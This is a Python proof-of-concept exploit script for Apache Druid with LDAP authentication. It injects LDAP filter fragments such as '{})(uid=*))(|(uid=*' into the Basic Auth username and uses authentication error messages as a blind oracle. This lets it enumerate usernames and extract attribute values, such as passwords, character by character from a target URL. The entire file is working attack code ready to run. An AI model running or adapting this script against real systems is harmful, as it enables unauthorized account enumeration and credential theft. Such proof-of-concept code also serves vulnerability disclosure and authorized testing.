#!/usr/bin/env python3

import argparse
import string
import logging
import requests
from requests.auth import HTTPBasicAuth


_URL = ''
_USER = ''
_ATTR = ''
_PATH = '/druid/coordinator/v1/isLeader'

_USER_MAX_LENGTH = 8
_USER_CHARSET = string.ascii_lowercase + string.digits + '_-@.'
_USER_FILTER = '{})(uid=*))(|(uid=*'

_ATTR_MAX_LENGTH = 20
_ATTR_CHARSET = string.ascii_lowercase + string.digits + '_@.'
_ATTR_CHARSET_EXCLUDE = ''
_ATTR_FILTER = '{user})({attr}={{}}))(|(uid=*'


def _exists(val, filter):
  logging.debug('USER {}'.format(filter.format(val)))
  r = requests.get(_URL.rstrip('/')+_PATH, auth=HTTPBasicAuth(filter.format(val), 'anything'))
  logging.debug('RESP {}'.format(r.reason))
  return r.reason.startswith('User authentication failed username')

def _exfiltrate(val, filter, charset, max_length, exclude='', stop_on_first=False):
  if _exists(val=val, filter=filter):
    print(val)
    if stop_on_first:
      return True

  if len(val) == max_length:
    return False

  for c in charset:
    if not c in exclude:
      if _exists(val=val+c+'*', filter=filter):
        ret = _exfiltrate(val=val + c, filter=filter, charset=charset, max_length=max_length, exclude=exclude)
        if ret and stop_on_first:
          return ret

def _enumerate_users():
  logging.info('Enumerating users from {}'.format(_URL))
  _exfiltrate(val='', filter=_USER_FILTER, charset=_USER_CHARSET, max_length=_USER_MAX_LENGTH)


def _exfiltrate_attr():
  logging.info('Exfiltrating {} attribute of {} user from {}'.format(_ATTR, _USER, _URL))
  _exfiltrate(val='', filter=_ATTR_FILTER.format(user=_USER, attr=_ATTR), charset=_ATTR_CHARSET,
              max_length=_ATTR_MAX_LENGTH, exclude=_ATTR_CHARSET_EXCLUDE, stop_on_first=True)


def main():
  parser = argparse.ArgumentParser(description='Druid PoC. Exfiltrate users and attributes from LDAP.')
  parser.add_argument('-v', dest='verbose', required=False, action='store_true', help='Enable debug logging')
  parser.add_argument('--url', dest='url', required=True, help='Druid URL, e.g. http://127.0.0.1:8888/')
  parser.add_argument('--user', dest='user', required=False, help='LDAP user for which to exfiltrate attribute value')
  parser.add_argument('--attr', dest='attribute', required=False, help='LDAP attribute to exfiltrate')
  args = parser.parse_args()

  global _URL
  _URL = args.url

  logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.DEBUG if args.verbose else logging.INFO)

  if args.user:
    global _USER, _ATTR
    _USER = args.user
    _ATTR = args.attribute
    _exfiltrate_attr()
  else:
    _enumerate_users()

if __name__ == '__main__':
  main()